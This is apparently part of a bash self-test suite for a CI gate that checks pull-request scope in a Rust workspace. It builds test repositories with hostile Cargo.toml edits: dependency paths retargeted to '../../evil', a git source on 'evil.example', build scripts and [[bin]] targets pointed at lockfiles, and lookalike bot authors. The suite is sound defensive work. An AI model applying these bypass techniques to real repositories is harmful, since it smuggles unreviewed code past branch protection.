printf '[package]\nname="pol"\nversion="0.1.0"\n\n[target.\x27cfg(unix)\x27.dev-dependencies]\nassert_cmd = "2.1"\n' > "$D36b/crates/pol/Cargo.toml"
commit_all "$D36b" "chore(deps): bump assert_cmd"
fake_gh 'dependabot[bot]' ''
echo "== a target.'cfg(unix)'.dev-dependencies string bump must stay EXEMPT =="
OUT36b="$(run_scope "$D36b")" && RC36b=0 || RC36b=$?
if [ "$RC36b" -ne 0 ]; then
  echo "FAIL: case 36b was expected to pass (rc=0) but exited non-zero (rc=$RC36b)." >&2
  echo "$OUT36b" | sed 's/^/    /' >&2
  FAILED=1
fi
if echo "$OUT36b" | grep -qF 'pr-scope-check: EXEMPT'; then
  note "a target-specific dev-dependencies string bump stays EXEMPT"
else
  echo "FAIL: a target.'cfg(unix)'.dev-dependencies string bump was refused. Got:"
  echo "$OUT36b" | sed 's/^/    /'
  FAILED=1
fi

# ---------------------------------------------------------------------------
# 37. A detailed-table dependency entry whose `path` sub-key changes, with
#     `version` untouched, must be refused and `path` named. Case 29 above
#     only exercises `features`; without a case naming `path` specifically, a
#     mutation that widens the sub-key skip-list to ALSO ignore `path` (not
#     just `version`) is invisible, and `path` is the sub-key that actually
#     retargets what gets compiled for an internal, non-crates.io dependency.
# ---------------------------------------------------------------------------
D37="$WORK/dependency-table-path-subkey-changed"
new_repo "$D37"
mkdir -p "$D37/crates/pol"
printf '[package]\nname="pol"\nversion="0.1.0"\n\n[dependencies]\nirontraffic-time = { path = "../irontraffic-time", version = "0.1.0" }\n' > "$D37/crates/pol/Cargo.toml"
commit_all "$D37" base
git -C "$D37" checkout -qb pr
printf '[package]\nname="pol"\nversion="0.1.0"\n\n[dependencies]\nirontraffic-time = { path = "../../evil", version = "0.1.0" }\n' > "$D37/crates/pol/Cargo.toml"
commit_all "$D37" "chore(deps): bump"
fake_gh 'dependabot[bot]' ''
echo "== a dependency's path sub-key changing, with version untouched, must be refused and named =="
OUT37="$(run_scope "$D37")" && RC37=0 || RC37=$?
if [ "$RC37" -eq 0 ]; then
  echo "FAIL: case 37 was expected to be refused (non-zero exit) but exited 0. A refusal-shaped" >&2
  echo "message with rc=0 is exactly the branch-protection bypass this suite exists to catch" >&2
  echo "(round six's own finding). Got:" >&2
  echo "$OUT37" | sed 's/^/    /' >&2
  FAILED=1
fi
if echo "$OUT37" | grep -qF 'pr-scope-check: EXEMPT'; then
  echo "FAIL: a dependency path retarget with version untouched was reported EXEMPT. Got:"
  echo "$OUT37" | sed 's/^/    /'
  FAILED=1
elif ! echo "$OUT37" | grep -qF '.path'; then
  echo "FAIL: refused, but the path sub-key was not named. Got:"
  echo "$OUT37" | sed 's/^/    /'
  FAILED=1
else
  note "a dependency's path sub-key change is refused and named"
fi

# ---------------------------------------------------------------------------
# 38. An ALREADY-DECLARED `[[bin]]` entry (present at base, same array length
#     at head) whose `path` is edited in place must be refused. Every
#     existing `[[bin]]`/`[[test]]`/`[[bench]]`/`[[example]]` case above
#     introduces the whole array where none existed before, which the dict-
#     level "introduces" branch reports without ever exercising the list
#     index-by-index comparison. This is the case that only that comparison
#     catches: same length, one element's content differs.
# ---------------------------------------------------------------------------
D38="$WORK/existing-bin-entry-path-edited-in-place"
new_repo "$D38"
mkdir -p "$D38/crates/pol/src"
printf 'fn main(){ println!("legit"); }\n' > "$D38/crates/pol/src/tool.rs"
printf '[package]\nname="pol"\nversion="0.1.0"\nedition="2021"\n\n[[bin]]\nname="tool"\npath="src/tool.rs"\n' > "$D38/crates/pol/Cargo.toml"
commit_all "$D38" base
git -C "$D38" checkout -qb pr
printf '[package]\nname="pol"\nversion="0.1.0"\nedition="2021"\n\n[[bin]]\nname="tool"\npath="src/lib.rs"\n' > "$D38/crates/pol/Cargo.toml"
commit_all "$D38" "chore(deps): bump"
fake_gh 'dependabot[bot]' ''
echo "== an already-declared [[bin]]'s path edited in place (same array length) must be refused =="
OUT38="$(run_scope "$D38")" && RC38=0 || RC38=$?
if [ "$RC38" -eq 0 ]; then
  echo "FAIL: case 38 was expected to be refused (non-zero exit) but exited 0. A refusal-shaped" >&2
  echo "message with rc=0 is exactly the branch-protection bypass this suite exists to catch" >&2
  echo "(round six's own finding). Got:" >&2
  echo "$OUT38" | sed 's/^/    /' >&2
  FAILED=1
fi
if echo "$OUT38" | grep -qF 'pr-scope-check: EXEMPT'; then
  echo "FAIL: an in-place [[bin]] path edit was reported EXEMPT. Got:"
  echo "$OUT38" | sed 's/^/    /'
  FAILED=1
else
  note "an in-place [[bin]] path edit is refused"
fi

# ---------------------------------------------------------------------------
# 39. A brand-new manifest (a bot PR that adds a whole new crate's Cargo.toml,
#     something a bot never legitimately does) must be refused, and the
#     refusal must say the keys were INTRODUCED, never be satisfied by a
#     generic "does not parse as TOML" message that would also fire if the
#     empty-base-versus-missing-base distinction were quietly lost. The root
#     manifest is deliberately left BYTE-IDENTICAL between base and head (the
#     new crate is simply not wired into `members` yet) so the only offense
#     in the whole diff can come from the brand-new file itself, with no
#     second, already-existing manifest change able to supply the word
#     "introduces" on its behalf.
# ---------------------------------------------------------------------------
D39="$WORK/brand-new-manifest"
new_repo "$D39"
printf '[workspace]\nresolver="2"\nmembers=[]\n' > "$D39/Cargo.toml"
commit_all "$D39" base
git -C "$D39" checkout -qb pr
mkdir -p "$D39/crates/newcrate"
printf '[package]\nname="newcrate"\nversion="0.1.0"\n\n[dependencies]\nserde = "1.0"\n' > "$D39/crates/newcrate/Cargo.toml"
commit_all "$D39" "chore(deps): bump"
fake_gh 'dependabot[bot]' ''
echo "== a brand-new manifest must be refused, named as introduced, not as a base parse failure =="
OUT39="$(run_scope "$D39")" && RC39=0 || RC39=$?
if [ "$RC39" -eq 0 ]; then
  echo "FAIL: case 39 was expected to be refused (non-zero exit) but exited 0. A refusal-shaped" >&2
  echo "message with rc=0 is exactly the branch-protection bypass this suite exists to catch" >&2
  echo "(round six's own finding). Got:" >&2
  echo "$OUT39" | sed 's/^/    /' >&2
  FAILED=1
fi
if echo "$OUT39" | grep -qF 'pr-scope-check: EXEMPT'; then
  echo "FAIL: a brand-new manifest was reported EXEMPT. Got:"
  echo "$OUT39" | sed 's/^/    /'
  FAILED=1
elif ! echo "$OUT39" | grep -qF 'introduces'; then
  echo "FAIL: refused, but not because the keys were reported as introduced (the empty-base-vs-missing-base distinction may be lost). Got:"
  echo "$OUT39" | sed 's/^/    /'
  FAILED=1
elif echo "$OUT39" | grep -qiF 'does not parse as toml'; then
  echo "FAIL: refused for the wrong reason (a base-parse-failure message), not because the keys were introduced. Got:"
  echo "$OUT39" | sed 's/^/    /'
  FAILED=1
else
  note "a brand-new manifest is refused, correctly reported as introducing its keys"
fi

# ---------------------------------------------------------------------------
# 40. A pure string-to-string change under a table path that only LOOKS like
#     a dependency table (`[lib.dependencies]`, two components deep, the
#     second one spelled "dependencies") must still be refused. Cargo has no
#     such table; `[lib]` never has a `dependencies` sub-key. This proves
#     `is_dep_table_path` matches the FIVE exact shapes named in the comment
#     above BOT_ALLOWED and nothing merely shaped like them: a match on "the
#     path's last component is named dependencies" regardless of what comes
#     before it would also match this nonsense table.
# ---------------------------------------------------------------------------
D40="$WORK/lookalike-two-level-dependencies-table"
new_repo "$D40"
mkdir -p "$D40/crates/pol/src"
printf 'pub fn x(){}\n' > "$D40/crates/pol/src/lib.rs"
printf '[package]\nname="pol"\nversion="0.1.0"\n\n[lib]\npath="src/lib.rs"\n\n[lib.dependencies]\nfoo = "1.0"\n' > "$D40/crates/pol/Cargo.toml"
commit_all "$D40" base
git -C "$D40" checkout -qb pr
printf '[package]\nname="pol"\nversion="0.1.0"\n\n[lib]\npath="src/lib.rs"\n\n[lib.dependencies]\nfoo = "2.0"\n' > "$D40/crates/pol/Cargo.toml"
commit_all "$D40" "chore(deps): bump"
fake_gh 'dependabot[bot]' ''
echo "== a lookalike two-level '...dependencies' table (not one of the five real shapes) must still be refused =="
OUT40="$(run_scope "$D40")" && RC40=0 || RC40=$?
if [ "$RC40" -eq 0 ]; then
  echo "FAIL: case 40 was expected to be refused (non-zero exit) but exited 0. A refusal-shaped" >&2
  echo "message with rc=0 is exactly the branch-protection bypass this suite exists to catch" >&2
  echo "(round six's own finding). Got:" >&2
  echo "$OUT40" | sed 's/^/    /' >&2
  FAILED=1
fi
if echo "$OUT40" | grep -qF 'pr-scope-check: EXEMPT'; then
  echo "FAIL: a change under a lookalike [lib.dependencies] table was reported EXEMPT. Got:"
  echo "$OUT40" | sed 's/^/    /'
  FAILED=1
else
  note "the lookalike table is refused; only the five real dependency-table shapes are exempt"
fi

# ---------------------------------------------------------------------------
# 41. Round three's own battery named this a survivor (N14) and it was never
#     closed: a PR body naming TWO DISTINCT issues must be refused, not
#     merely "at least one" accepted. Case 7 above tests ZERO closing
#     keywords; the residual one-issue-rule check in round three's own review
#     evidence exercised this by hand, never through a self-test case, so a
#     mutation loosening `[ "$count" -ne 1 ]` to `[ "$count" -lt 1 ]` (N14)
#     survived undetected. `#42` and `#43, ... #44` deliberately land THREE
#     distinct numbers so deduping to one, or to two, both still fail this
#     case if the loosened check only rejects `count -lt 1`.
# ---------------------------------------------------------------------------
D41="$WORK/two-distinct-closing-issues"
new_repo "$D41"
mkdir -p "$D41/crates/pol"
printf '[package]\nname="pol"\nversion="0.1.0"\n' > "$D41/crates/pol/Cargo.toml"
commit_all "$D41" base
git -C "$D41" checkout -qb pr
printf '[package]\nname="pol"\nversion="0.1.1"\n' > "$D41/crates/pol/Cargo.toml"
commit_all "$D41" implement
fake_gh 'coder-agent' 'Closes #42 and fixes #43'
echo "== a PR body naming two distinct issues must be refused, not merely accepted as at-least-one =="
OUT41="$(run_scope "$D41")" && RC41=0 || RC41=$?
if [ "$RC41" -eq 0 ]; then
  echo "FAIL: case 41 was expected to be refused (non-zero exit) but exited 0. A refusal-shaped" >&2
  echo "message with rc=0 is exactly the branch-protection bypass this suite exists to catch" >&2
  echo "(round six's own finding). Got:" >&2
  echo "$OUT41" | sed 's/^/    /' >&2
  FAILED=1
fi
if echo "$OUT41" | grep -qF 'pr-scope-check: the diff matches issue'; then
  echo "FAIL: a PR closing two distinct issues was accepted. Got:"
  echo "$OUT41" | sed 's/^/    /'
  FAILED=1
elif ! echo "$OUT41" | grep -qF 'closes 2 issues'; then
  echo "FAIL: refused, but not for the two-issues reason. Got:"
  echo "$OUT41" | sed 's/^/    /'
  FAILED=1
else
  note "a PR closing two distinct issues is refused, naming the count"
fi

# ---------------------------------------------------------------------------
# 42. Round three's own battery named this a survivor too (N19): the non-bot
#     path's nested-lockfile exemption ties `crates/<n>/fuzz/Cargo.lock` to
#     its SIBLING manifest being declared. A coder-agent PR that touches the
#     lockfile while its sibling `crates/<n>/fuzz/Cargo.toml` is declared
#     NOWHERE in the issue must be refused and the lockfile named as
#     undeclared. Flipping the tie's sense (`sib_declared -eq 0` instead of
#     `-eq 1`) would silently forgive exactly this case, and no prior case
#     exercised a nested lockfile on the NON-BOT path at all (cases 15 and 21
#     above are bot-path only).
# ---------------------------------------------------------------------------
D42="$WORK/nonbot-nested-lockfile-sibling-not-declared"
new_repo "$D42"
mkdir -p "$D42/crates/pol/fuzz/fuzz_targets" "$D42/crates/pol/src"
printf 'pub fn x(){}\n' > "$D42/crates/pol/src/lib.rs"
printf '[package]\nname="pol"\nversion="0.1.0"\n' > "$D42/crates/pol/Cargo.toml"
printf '[package]\nname="pol-fuzz"\nversion="0.0.0"\npublish=false\n\n[workspace]\n\n[dependencies]\nlibfuzzer-sys="0.4"\n\n[[bin]]\nname="t"\npath="fuzz_targets/t.rs"\n' > "$D42/crates/pol/fuzz/Cargo.toml"
printf '#![no_main]\n' > "$D42/crates/pol/fuzz/fuzz_targets/t.rs"
printf 'placeholder\n' > "$D42/crates/pol/fuzz/Cargo.lock"
commit_all "$D42" base
git -C "$D42" checkout -qb pr
printf 'attacker-controlled content, no declared manifest ties it to anything reviewed\n' > "$D42/crates/pol/fuzz/Cargo.lock"
commit_all "$D42" implement
fake_gh 'coder-agent' 'Closes #42' '## Files

| Path | Action | Purpose |
| --- | --- | --- |
| `crates/pol/src/lib.rs` | modify | unrelated change in the same PR |
'
echo "== a nested fuzz lockfile whose sibling manifest is NOT declared must be refused on the non-bot path =="
OUT42="$(run_scope "$D42")" && RC42=0 || RC42=$?
if [ "$RC42" -eq 0 ]; then
  echo "FAIL: case 42 was expected to be refused (non-zero exit) but exited 0. A refusal-shaped" >&2
  echo "message with rc=0 is exactly the branch-protection bypass this suite exists to catch" >&2
  echo "(round six's own finding). Got:" >&2
  echo "$OUT42" | sed 's/^/    /' >&2
  FAILED=1
fi
if echo "$OUT42" | grep -qF 'pr-scope-check: the diff matches issue'; then
  echo "FAIL: a nested lockfile with an undeclared sibling manifest was accepted as matching. Got:"
  echo "$OUT42" | sed 's/^/    /'
  FAILED=1
elif ! echo "$OUT42" | grep -qF 'crates/pol/fuzz/Cargo.lock'; then
  echo "FAIL: refused, but the nested lockfile was not named among the undeclared paths. Got:"
  echo "$OUT42" | sed 's/^/    /'
  FAILED=1
else
  note "a nested lockfile with an undeclared sibling manifest is refused and named"
fi

# ===========================================================================
# ROUND FIVE. Cases 43 to 46 close four of the five survivors of the
# reviewer's own 37-mutation battery against the round-four allowlist engine
# and the author gate (the fifth, M06, is case 8 above, tightened rather than
# added to). Two of these, 43 and 44, are on the allowlist engine itself, the
# function this whole round exists to add.
# ---------------------------------------------------------------------------

# ---------------------------------------------------------------------------
# 43. M19: a dependency entry changing SHAPE, a bare string becoming a
#     detailed table, must be refused. `dep_entry_offenses` has an explicit
#     branch for exactly this ("if not (isinstance base dict and isinstance
#     head dict): return [an offense]"); disabling it (returning [] instead)
#     is undetected by every other case in this file, because no other case
#     makes a dependency value change TYPE, only its version or, in cases 29
#     and 37, a sub-key of an already-detailed table. This is the single
#     branch stopping `logos = "0.15"` becoming `logos = { git =
#     "https://evil.example/logos" }`: a version bump never needs to change
#     what KIND of value a dependency is, only what the string or the version
#     sub-key says.
# ---------------------------------------------------------------------------
D43="$WORK/dependency-shape-change-string-to-table"
new_repo "$D43"
mkdir -p "$D43/crates/pol"
printf '[package]\nname="pol"\nversion="0.1.0"\n\n[dependencies]\nlogos = "0.15"\n' > "$D43/crates/pol/Cargo.toml"
commit_all "$D43" base
git -C "$D43" checkout -qb pr
printf '[package]\nname="pol"\nversion="0.1.0"\n\n[dependencies]\nlogos = { git = "https://evil.example/logos" }\n' > "$D43/crates/pol/Cargo.toml"
commit_all "$D43" "chore(deps): bump logos"
fake_gh 'dependabot[bot]' ''
echo "== M19: a dependency value changing from a bare string to a detailed table (git source) must be refused =="
OUT43="$(run_scope "$D43")" && RC43=0 || RC43=$?
if [ "$RC43" -eq 0 ]; then
  echo "FAIL: case 43 was expected to be refused (non-zero exit) but exited 0. A refusal-shaped" >&2
  echo "message with rc=0 is exactly the branch-protection bypass this suite exists to catch" >&2
  echo "(round six's own finding). Got:" >&2
  echo "$OUT43" | sed 's/^/    /' >&2
  FAILED=1
fi
if echo "$OUT43" | grep -qF 'pr-scope-check: EXEMPT'; then
  echo "FAIL: a dependency shape change (string to detailed table) was reported EXEMPT. Got:"
  echo "$OUT43" | sed 's/^/    /'
  FAILED=1
elif ! { echo "$OUT43" | grep -qF 'logos' && echo "$OUT43" | grep -qF 'not a version-string move'; }; then
  echo "FAIL: refused, but not naming the dependency and the shape-change reason. Got:"
  echo "$OUT43" | sed 's/^/    /'
  FAILED=1
else
  note "a dependency value changing shape (string to table) is refused and named"
fi

# ---------------------------------------------------------------------------
# 44. M29: widening `is_dep_table_path` to also accept `("package",)` makes
#     `[package]` itself read as a dependency table, so any of ITS
#     string-valued keys, including `build`, changing from one string to
#     another string falls into the bare-string-to-bare-string branch of
#     `dep_entry_offenses` ("any new string is allowed") and is silently
#     treated as a version move. No existing case changes an existing
#     package.build VALUE: case 21 has one that stays byte-identical, case 28
#     covers it being REMOVED, neither exercises it being RETARGETED.
#     `crates/irontraffic-origin/Cargo.toml` has a real `build = "build.rs"`
#     today, so this is not a hypothetical shape.
# ---------------------------------------------------------------------------
D44="$WORK/package-build-retargeted-string-to-string"
new_repo "$D44"
mkdir -p "$D44/crates/pol"
printf 'fn main(){ println!("legit"); }\n' > "$D44/crates/pol/build.rs"
printf '[package]\nname="pol"\nversion="0.1.0"\nbuild="build.rs"\n' > "$D44/crates/pol/Cargo.toml"
commit_all "$D44" base
git -C "$D44" checkout -qb pr
printf '[package]\nname="pol"\nversion="0.1.0"\nbuild="fuzz/Cargo.lock"\n' > "$D44/crates/pol/Cargo.toml"
commit_all "$D44" "chore(deps): bump"
fake_gh 'dependabot[bot]' ''
echo "== M29: package.build retargeted from one string to another must be refused (package is not a dependency table) =="
OUT44="$(run_scope "$D44")" && RC44=0 || RC44=$?
if [ "$RC44" -eq 0 ]; then
  echo "FAIL: case 44 was expected to be refused (non-zero exit) but exited 0. A refusal-shaped" >&2
  echo "message with rc=0 is exactly the branch-protection bypass this suite exists to catch" >&2
  echo "(round six's own finding). Got:" >&2
  echo "$OUT44" | sed 's/^/    /' >&2
  FAILED=1
fi
if echo "$OUT44" | grep -qF 'pr-scope-check: EXEMPT'; then
  echo "FAIL: package.build retargeted string-to-string was reported EXEMPT. Got:"
  echo "$OUT44" | sed 's/^/    /'
  FAILED=1
elif ! echo "$OUT44" | grep -qF 'package.build'; then
  echo "FAIL: refused, but package.build was not named as the reason. Got:"
  echo "$OUT44" | sed 's/^/    /'
  FAILED=1
else
  note "package.build being retargeted string-to-string is refused and named"
fi

# ---------------------------------------------------------------------------
# 45. M11: widening the author match from the three named bot logins to any
#     `[bot]`-suffixed author (`case "$author" in *\[bot\]\)`) would exempt
#     any GitHub App installed on the repository, not only the three this
#     script actually trusts. A PR from an unrecognised bot-suffixed author,
#     touching only an allowlisted-shaped manifest path and with no closing
#     keyword in its body, must be refused for the ORDINARY non-bot reason
#     ("does not close an issue"), never take the bot-exempt branch at all.
# ---------------------------------------------------------------------------
D45="$WORK/unrecognised-bot-suffixed-author"
new_repo "$D45"
mkdir -p "$D45/crates/pol"
printf '[package]\nname="pol"\nversion="0.1.0"\n' > "$D45/crates/pol/Cargo.toml"
commit_all "$D45" base
git -C "$D45" checkout -qb pr
printf '[package]\nname="pol"\nversion="0.1.1"\n' > "$D45/crates/pol/Cargo.toml"
commit_all "$D45" bump
fake_gh 'sneaky-app[bot]' 'no closing keyword here'
echo "== an unrecognised bot-suffixed author must NOT take the bot-exempt path =="
OUT45="$(run_scope "$D45")" && RC45=0 || RC45=$?
if [ "$RC45" -eq 0 ]; then
  echo "FAIL: case 45 was expected to be refused (non-zero exit) but exited 0. A refusal-shaped" >&2
  echo "message with rc=0 is exactly the branch-protection bypass this suite exists to catch" >&2
  echo "(round six's own finding). Got:" >&2
  echo "$OUT45" | sed 's/^/    /' >&2
  FAILED=1
fi
if echo "$OUT45" | grep -qF 'pr-scope-check: EXEMPT'; then
  echo "FAIL: an author outside the three named bot logins was exempted as a bot. Got:"
  echo "$OUT45" | sed 's/^/    /'
  FAILED=1
elif ! echo "$OUT45" | grep -qF 'does not close an issue'; then
  echo "FAIL: refused, but not for the ordinary non-bot reason, so it may have taken the bot branch anyway. Got:"
  echo "$OUT45" | sed 's/^/    /'
  FAILED=1
else
  note "an author outside the three named bot logins is treated as an ordinary non-bot author"
fi

# ---------------------------------------------------------------------------
# 46. M34: the non-bot nested-lockfile exemption must tie
#     `crates/<n>/fuzz/Cargo.lock` to its OWN sibling manifest being declared,
#     not to SOME declared manifest existing anywhere in the tree. Case 42
#     above declares no Cargo.toml at all, so it cannot distinguish "checks
#     the specific sibling" from "checks whether anything is declared": both
#     rules refuse it, for want of any declared manifest. Here a DIFFERENT,
#     unrelated crate's manifest IS declared (`crates/other/Cargo.toml`),
#     while the lockfile's actual sibling (`crates/pol/fuzz/Cargo.toml`) is
#     not declared anywhere. The correct, sibling-specific rule still refuses
#     the lockfile; a mutant that widens the tie to "any declared manifest"
#     would incorrectly forgive it because SOME manifest is declared.
# ---------------------------------------------------------------------------
D46="$WORK/nonbot-nested-lockfile-wrong-manifest-declared"
new_repo "$D46"
mkdir -p "$D46/crates/pol/fuzz/fuzz_targets" "$D46/crates/other"
printf '[package]\nname="pol"\nversion="0.1.0"\n' > "$D46/crates/pol/Cargo.toml"
printf '[package]\nname="pol-fuzz"\nversion="0.0.0"\npublish=false\n\n[workspace]\n\n[dependencies]\nlibfuzzer-sys="0.4"\n\n[[bin]]\nname="t"\npath="fuzz_targets/t.rs"\n' > "$D46/crates/pol/fuzz/Cargo.toml"
printf '#![no_main]\n' > "$D46/crates/pol/fuzz/fuzz_targets/t.rs"
printf 'placeholder\n' > "$D46/crates/pol/fuzz/Cargo.lock"
printf '[package]\nname="other"\nversion="0.1.0"\n' > "$D46/crates/other/Cargo.toml"
commit_all "$D46" base
git -C "$D46" checkout -qb pr
printf 'attacker-controlled content, no DECLARED sibling ties it to anything reviewed\n' > "$D46/crates/pol/fuzz/Cargo.lock"
commit_all "$D46" implement
fake_gh 'coder-agent' 'Closes #42' '## Files

| Path | Action | Purpose |
| --- | --- | --- |
| `crates/other/Cargo.toml` | modify | a completely unrelated crate, declared but not touched by this diff |
'
echo "== a nested fuzz lockfile must be tied to its OWN sibling manifest, not to some OTHER declared manifest =="
OUT46="$(run_scope "$D46")" && RC46=0 || RC46=$?
if [ "$RC46" -eq 0 ]; then
  echo "FAIL: case 46 was expected to be refused (non-zero exit) but exited 0. A refusal-shaped" >&2
  echo "message with rc=0 is exactly the branch-protection bypass this suite exists to catch" >&2
  echo "(round six's own finding). Got:" >&2
  echo "$OUT46" | sed 's/^/    /' >&2
  FAILED=1
fi
if echo "$OUT46" | grep -qF 'pr-scope-check: the diff matches issue'; then
  echo "FAIL: a nested lockfile was forgiven because an UNRELATED manifest was declared, not its own sibling. Got:"
  echo "$OUT46" | sed 's/^/    /'
  FAILED=1
elif ! echo "$OUT46" | grep -qF 'crates/pol/fuzz/Cargo.lock'; then
  echo "FAIL: refused, but the nested lockfile was not named among the undeclared paths. Got:"
  echo "$OUT46" | sed 's/^/    /'
  FAILED=1
else
  note "the nested lockfile is refused and named; an unrelated declared manifest does not forgive it"
fi

# ===========================================================================
# ROUND SIX. The round-five review found that the rc plumbing fixed above
# (run_scope no longer eats the real exit code with `|| true`) was applied to
# three of the script's eleven exit sites only (case 47's guards); every case
# that goes through run_scope asserted text alone, so eight of the eleven
# `exit 1` refusals could each become `exit 0` with this whole suite still
# green, including the bot-path refusal (line 660) this entire PR series
# exists to harden. That is now fixed for every case above (cases 1 to 46b),
# not case by case here. Cases 46b to 46e close the three remaining named
# gaps: the list branch's unpinned append arm, and the two round-five cases
# (44 and 45) that only pinned the exact mutant named and not the
# neighbouring one-token relaxation of the same rule.
# ---------------------------------------------------------------------------

# ---------------------------------------------------------------------------
# 46b. The engine's list branch has three arms: appended entries
#      (`i >= len(base)`), removed entries, and edited entries. Case 38 above
#      edits an EXISTING [[bin]] entry in place, at an unchanged array
#      length, and pins the edited-entry arm. No case pins the appended-entry
#      arm: every `[[bin]]`/`[[test]]`/`[[bench]]`/`[[example]]` case in this
#      file, including case 38, either edits an existing single-entry array
#      or introduces the WHOLE array from nothing (caught by the generic
#      dict branch's "introduces bin = [...]" before the list comparison is
#      ever reached), so a mutation that silently drops the `i >= len(base)`
#      branch (turning it into a no-op) is invisible to every case above.
#
#      Not hypothetical: `git ls-files` on this repository shows 26 tracked
#      Cargo.toml files carrying 74 `[[bin]]`/`[[bench]]` entries between
#      them, and every `crates/*/fuzz/Cargo.toml` already has one `[[bin]]`
#      sitting on BOT_ALLOWED next to its own `fuzz/Cargo.lock`. Appending a
#      SECOND `[[bin]]` whose `path` is that sibling lockfile lands vector
#      4's capability (a Cargo target compiling and running the lockfile's
#      content) through the one branch nothing above exercises.
# ---------------------------------------------------------------------------
D46b="$WORK/list-branch-append-arm-pinned"
new_repo "$D46b"
mkdir -p "$D46b/crates/pol/fuzz/fuzz_targets"
printf '[package]\nname="pol-fuzz"\nversion="0.0.0"\npublish=false\nedition="2021"\n\n[workspace]\n\n[dependencies]\nlibfuzzer-sys="0.4"\n\n[[bin]]\nname="t"\npath="fuzz_targets/t.rs"\n' > "$D46b/crates/pol/fuzz/Cargo.toml"
printf '#![no_main]\n' > "$D46b/crates/pol/fuzz/fuzz_targets/t.rs"
printf '# placeholder fuzz lockfile\n' > "$D46b/crates/pol/fuzz/Cargo.lock"
commit_all "$D46b" base
git -C "$D46b" checkout -qb pr
printf '[package]\nname="pol-fuzz"\nversion="0.0.0"\npublish=false\nedition="2021"\n\n[workspace]\n\n[dependencies]\nlibfuzzer-sys="0.4"\n\n[[bin]]\nname="t"\npath="fuzz_targets/t.rs"\n\n[[bin]]\nname="evil"\npath="Cargo.lock"\n' > "$D46b/crates/pol/fuzz/Cargo.toml"
printf 'fn main(){ /* arbitrary code, smuggled via an APPENDED [[bin]] entry the array-introduction branch never sees */ }\n' > "$D46b/crates/pol/fuzz/Cargo.lock"
commit_all "$D46b" "chore(deps): bump libfuzzer-sys"
fake_gh 'dependabot[bot]' ''
echo "== the list branch's APPEND arm must be pinned: a second [[bin]] appended to an existing array, path=Cargo.lock, must be refused =="
OUT46b="$(run_scope "$D46b")" && RC46b=0 || RC46b=$?
if [ "$RC46b" -eq 0 ]; then
  echo "FAIL: case 46b was expected to be refused (non-zero exit) but exited 0. A refusal-shaped" >&2
  echo "message with rc=0 is exactly the branch-protection bypass this suite exists to catch" >&2
  echo "(round six's own finding). Got:" >&2
  echo "$OUT46b" | sed 's/^/    /' >&2
  FAILED=1
fi
if echo "$OUT46b" | grep -qF 'pr-scope-check: EXEMPT'; then
  echo "FAIL: an appended [[bin]] entry pointed at the sibling lockfile was reported EXEMPT. Got:"
  echo "$OUT46b" | sed 's/^/    /'
  FAILED=1
elif ! echo "$OUT46b" | grep -qF 'bin[1]'; then
  echo "FAIL: refused, but the appended entry was not named as bin[1]. Got:"
  echo "$OUT46b" | sed 's/^/    /'
  FAILED=1
else
  note "an appended [[bin]] entry is refused and named, pinning the list branch's append arm"
fi

# ---------------------------------------------------------------------------
# 46c. Round five's case 45 (M11) closed widening the author match to any
#      `*\[bot\]`-suffixed login, using `sneaky-app[bot]`, which does not
#      start with "dependabot". It did not close the OTHER obvious one-token
#      relaxation of the same case arm: `dependabot*` (a bare prefix match,
#      dropping the `\[bot\]` and the exact `[bot]` login entirely). That
#      widening matches a real historical login family this repository could
#      plausibly see, `dependabot-preview[bot]`, as well as any account whose
#      name merely starts with "dependabot". This author must still take the
#      ORDINARY non-bot path and be refused for having no closing keyword,
#      the same shape case 45 already checks, so that a widened match (which
#      would route it into the bot arm instead, changing the refusal reason
#      to a manifest-capability offense rather than "does not close an
#      issue") is caught by the missing text rather than merely by rc, the
#      same defence-in-depth case 45 already relies on.
# ---------------------------------------------------------------------------
D46c="$WORK/dependabot-prefix-widening"
new_repo "$D46c"
mkdir -p "$D46c/crates/pol"
printf '[package]\nname="pol"\nversion="0.1.0"\n' > "$D46c/crates/pol/Cargo.toml"
commit_all "$D46c" base
git -C "$D46c" checkout -qb pr
printf '[package]\nname="pol"\nversion="0.1.1"\n' > "$D46c/crates/pol/Cargo.toml"
commit_all "$D46c" bump
fake_gh 'dependabot-preview[bot]' 'no closing keyword here'
echo "== an author merely starting with dependabot (not the exact dependabot[bot] login) must NOT take the bot-exempt path =="
OUT46c="$(run_scope "$D46c")" && RC46c=0 || RC46c=$?
if [ "$RC46c" -eq 0 ]; then
  echo "FAIL: case 46c was expected to be refused (non-zero exit) but exited 0. A refusal-shaped" >&2
  echo "message with rc=0 is exactly the branch-protection bypass this suite exists to catch" >&2
  echo "(round six's own finding). Got:" >&2
  echo "$OUT46c" | sed 's/^/    /' >&2
  FAILED=1
fi
if echo "$OUT46c" | grep -qF 'pr-scope-check: EXEMPT'; then
  echo "FAIL: an author only starting with dependabot, not the exact login, was exempted as a bot. Got:"
  echo "$OUT46c" | sed 's/^/    /'
  FAILED=1
elif ! echo "$OUT46c" | grep -qF 'does not close an issue'; then
  echo "FAIL: refused, but not for the ordinary non-bot reason, so it may have taken the bot branch anyway. Got:"
  echo "$OUT46c" | sed 's/^/    /'
  FAILED=1
else
  note "an author merely starting with dependabot is treated as an ordinary non-bot author"
fi

# ---------------------------------------------------------------------------
# 46d. Round five's case 44 (M29) closed `is_dep_table_path` also accepting
#      `("package",)`. It did not close the sibling shape door 3 is about:
#      `("patch", "crates-io")`. Door 3 (case 25) cannot pin this on its own
#      because it INTRODUCES `[patch]` from nothing, which the top level
#      dict branch reports as `introduces patch = {...}` and refuses without
#      ever recursing far enough to ask `is_dep_table_path` about
#      `("patch", "crates-io")` at all. The delta only shows on an EXISTING
#      patch entry whose bare string value moves: base already has
#      `[patch.crates-io]` with an entry, head only changes that entry's
#      string. The shipped engine refuses this correctly today (a plain
#      recursive diff on a non-dependency-table path); a mutation widening
#      `is_dep_table_path` to also treat `[patch.crates-io]` as a table whose
#      entries may move version-only would let a bare-string-to-bare-string
#      change through silently, the same branch case 43 pins for
#      `[dependencies]`.
# ---------------------------------------------------------------------------
D46d="$WORK/existing-patch-entry-bare-string-retargeted"
new_repo "$D46d"
mkdir -p "$D46d/crates/pol/src"
printf '[workspace]\nresolver="2"\nmembers=["crates/pol"]\n\n[patch.crates-io]\nlibc = "0.2.0"\n' > "$D46d/Cargo.toml"
printf 'pub fn x(){}\n' > "$D46d/crates/pol/src/lib.rs"
printf '[package]\nname="pol"\nversion="0.1.0"\n' > "$D46d/crates/pol/Cargo.toml"
commit_all "$D46d" base
git -C "$D46d" checkout -qb pr
